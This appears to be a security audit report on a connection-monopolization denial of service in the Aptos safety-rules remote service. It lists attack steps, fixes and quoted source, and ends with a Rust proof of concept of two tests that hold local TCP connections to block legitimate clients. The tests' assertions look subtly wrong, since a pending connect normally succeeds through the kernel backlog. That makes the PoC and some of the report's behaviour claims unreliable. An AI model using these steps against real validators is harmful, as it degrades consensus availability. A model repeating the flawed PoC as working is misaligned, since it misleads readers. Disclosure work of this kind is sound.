# Audit Report

## Title
Safety Rules Remote Service Connection Monopolization Denial of Service

## Summary

The `NetworkServer` implementation used by the safety-rules remote service accepts only one client connection at a time, with no connection limits or rate limiting. An attacker can monopolize this single connection slot, preventing legitimate consensus nodes from accessing the safety rules service and causing consensus operations to fail. [1](#0-0) 

## Finding Description

The safety-rules remote service uses `NetworkServer` from `aptos_secure_net` to handle requests from consensus nodes. The `NetworkServer` maintains only a single active client connection via the `stream: Option<NetworkStream>` field. [2](#0-1) 

The `client()` method only calls `listener.accept()` when `self.stream.is_none()`, meaning new connections are only accepted after the current connection is dropped or encounters an error. The service runs in a tight loop processing messages from this single connection: [3](#0-2) 

**Attack Vector:**

1. Attacker discovers the `listen_addr` of a safety-rules remote service (configured via `RemoteService` in testnet or non-mainnet validators)
2. Attacker opens multiple TCP connections to the service (e.g., 1000 connections)
3. First connection is accepted; remaining connections queue in TCP backlog (typically ~128 on Linux)
4. Attacker sends valid but slow messages on the first connection to maintain control
5. Legitimate consensus nodes attempting to connect either wait indefinitely in the backlog queue or receive connection refused errors
6. Even if the attacker's connection times out, the next connection accepted is likely another attacker connection from the queue

The implementation has **no authentication, no TLS encryption, no connection limits, and no rate limiting**. The TCP listener is created with default settings: [4](#0-3) 

This breaks the **availability invariant** for consensus operations and the **Resource Limits** invariant requiring all operations to respect resource constraints.

## Impact Explanation

This is a **High Severity** vulnerability per Aptos bug bounty criteria, specifically "Validator node slowdowns" and "Significant protocol violations."

While mainnet validators are enforced to use `SafetyRulesService::Local` mode for optimal performance: [5](#0-4) 

The vulnerability affects:
- **All testnet validators** using `Process(RemoteService)` mode for safety-rules separation
- **Development and staging environments** where the remote service pattern is deployed
- **Any validator** that bypasses or disables the configuration sanitizer
- **Future deployments** where Process mode might be enabled for security isolation

The comment in the codebase explicitly describes this as "the production, separate service approach": [6](#0-5) 

Impact includes:
- **Consensus operations blocked** - Safety rules are critical for validator voting and block signing
- **Validator downtime** - Affected validators cannot participate in consensus
- **Network liveness degradation** - Multiple affected validators reduce network resilience

## Likelihood Explanation

**Likelihood: Medium-High**

The attack requires:
- Network access to the safety-rules service `listen_addr` (likely localhost or internal network)
- Basic TCP connection capabilities (no authentication required)
- Knowledge of the service port (may be discoverable or default)

The attack is **trivial to execute** using standard networking tools (netcat, Python socket, etc.) and requires no specialized knowledge or resources. The single-threaded blocking server design makes this vulnerability inherently exploitable.

For mainnet validators, likelihood is LOW due to enforced Local mode. For testnet and development environments, likelihood is HIGH due to lack of network security controls on the remote service.

## Recommendation

Implement connection management and security controls for `NetworkServer`:

**1. Add connection limits and queue management:**
```rust
pub struct NetworkServer {
    service: String,
    listener: Option<TcpListener>,
    stream: Option<NetworkStream>,
    timeout_ms: u64,
    max_pending_connections: usize, // Add backlog limit
    allowed_clients: Option<Vec<SocketAddr>>, // Add allowlist
}
```

**2. Implement connection pooling or concurrent connection handling:**
Replace the single-connection model with a thread pool or async runtime to handle multiple concurrent clients, with per-client rate limiting.

**3. Add authentication and TLS:**
Use mutual TLS or the existing Noise protocol authentication to verify client identities before accepting connections.

**4. Implement application-level timeouts:**
Add idle connection timeouts and maximum connection duration limits to prevent connection monopolization.

**5. Add connection rate limiting:**
Implement per-IP rate limiting to prevent rapid connection attempts from exhausting the backlog queue.

**Example mitigation (partial):**
```rust
impl NetworkServer {
    pub fn new(service: String, listen: SocketAddr, timeout_ms: u64) -> Self {
        let listener = TcpListener::bind(listen).unwrap();
        // Set TCP backlog to a reasonable limit
        // Note: Rust's TcpListener::bind doesn't expose backlog parameter directly
        // Would need to use socket2 crate for low-level socket options
        
        Self {
            service,
            listener: Some(listener),
            stream: None,
            timeout_ms,
        }
    }
    
    // Add method to validate and rate-limit connections
    fn validate_client(&self, addr: &SocketAddr) -> Result<(), Error> {
        // Implement rate limiting, allowlist checks
        // Return error if client should be rejected
        Ok(())
    }
}
```

## Proof of Concept

```rust
// File: consensus/safety-rules/src/remote_service_dos_test.rs
#[cfg(test)]
mod dos_test {
    use super::*;
    use aptos_config::utils;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream};
    use std::thread;
    use std::time::Duration;

    #[test]
    fn test_connection_monopolization_dos() {
        // Start safety-rules remote service on a test port
        let server_port = utils::get_available_port();
        let server_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), server_port);
        
        // Spawn server in background thread
        thread::spawn(move || {
            let storage = PersistentSafetyStorage::in_memory_for_testing();
            execute(storage, server_addr, 5000);
        });
        
        thread::sleep(Duration::from_millis(100)); // Let server start
        
        // Attacker opens first connection and holds it
        let attacker_conn = TcpStream::connect(server_addr)
            .expect("Attacker should connect");
        attacker_conn.set_nodelay(true).unwrap();
        
        // Keep attacker connection alive but idle
        thread::spawn(move || {
            let _conn = attacker_conn;
            thread::sleep(Duration::from_secs(10));
            // Connection held for 10 seconds
        });
        
        thread::sleep(Duration::from_millis(100));
        
        // Legitimate client tries to connect
        let legitimate_result = TcpStream::connect_timeout(
            &server_addr, 
            Duration::from_millis(1000)
        );
        
        // Legitimate client should timeout or fail to connect
        // because attacker is holding the single connection slot
        assert!(
            legitimate_result.is_err(),
            "Legitimate client should not be able to connect while attacker holds connection"
        );
    }
    
    #[test]
    fn test_backlog_exhaustion() {
        let server_port = utils::get_available_port();
        let server_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), server_port);
        
        thread::spawn(move || {
            let storage = PersistentSafetyStorage::in_memory_for_testing();
            execute(storage, server_addr, 5000);
        });
        
        thread::sleep(Duration::from_millis(100));
        
        // Open many connections to fill the TCP backlog
        let mut connections = vec![];
        for _ in 0..200 {
            if let Ok(conn) = TcpStream::connect(server_addr) {
                connections.push(conn);
            }
        }
        
        // Eventually, new connections should be refused
        // because backlog is full and server only accepts one at a time
        assert!(
            connections.len() < 200,
            "Should not be able to open unlimited connections"
        );
    }
}
```

## Notes

**Deployment Context**: While mainnet validators are enforced to use `Local` mode, the vulnerability exists in production code intended for "separate service approach" deployments. Test networks, development environments, and any validators that bypass configuration sanitization are vulnerable. The lack of authentication and encryption on the remote service compounds the security risk.

**Mitigation Priority**: This should be fixed before enabling `Process` mode for any production validators, and testnet validators should immediately add network-level access controls (firewall rules, VPNs) as a temporary mitigation until the code-level fix is implemented.

### Citations

**File:** secure/net/src/lib.rs (L272-278)
```rust
pub struct NetworkServer {
    service: String,
    listener: Option<TcpListener>,
    stream: Option<NetworkStream>,
    /// Read, Write, Connect timeout in milliseconds.
    timeout_ms: u64,
}
```

**File:** secure/net/src/lib.rs (L281-289)
```rust
    pub fn new(service: String, listen: SocketAddr, timeout_ms: u64) -> Self {
        let listener = TcpListener::bind(listen);
        Self {
            service,
            listener: Some(listener.unwrap()),
            stream: None,
            timeout_ms,
        }
    }
```

**File:** secure/net/src/lib.rs (L365-404)
```rust
    fn client(&mut self) -> Result<&mut NetworkStream, Error> {
        if self.stream.is_none() {
            self.increment_counter(Method::Connect, MethodResult::Query);
            info!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::ConnectionAttempt,
            ));

            let listener = self.listener.as_mut().ok_or(Error::AlreadyShutdown)?;

            let (stream, stream_addr) = match listener.accept() {
                Ok(ok) => ok,
                Err(err) => {
                    self.increment_counter(Method::Connect, MethodResult::Failure);
                    let err = err.into();
                    warn!(SecureNetLogSchema::new(
                        &self.service,
                        NetworkMode::Server,
                        LogEvent::ConnectionSuccessful,
                    )
                    .error(&err));
                    return Err(err);
                },
            };

            self.increment_counter(Method::Connect, MethodResult::Success);
            info!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::ConnectionSuccessful,
            )
            .remote_peer(&stream_addr));

            stream.set_nodelay(true)?;
            self.stream = Some(NetworkStream::new(stream, stream_addr, self.timeout_ms));
        }

        self.stream.as_mut().ok_or(Error::NoActiveStream)
    }
```

**File:** consensus/safety-rules/src/remote_service.rs (L40-55)
```rust
    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
}

fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
}
```

**File:** config/src/config/safety_rules_config.rs (L98-104)
```rust
            // Verify that the safety rules service is set to local for optimal performance
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```

**File:** config/src/config/safety_rules_config.rs (L209-210)
```rust
    /// This is the production, separate service approach
    Process(RemoteService),
```
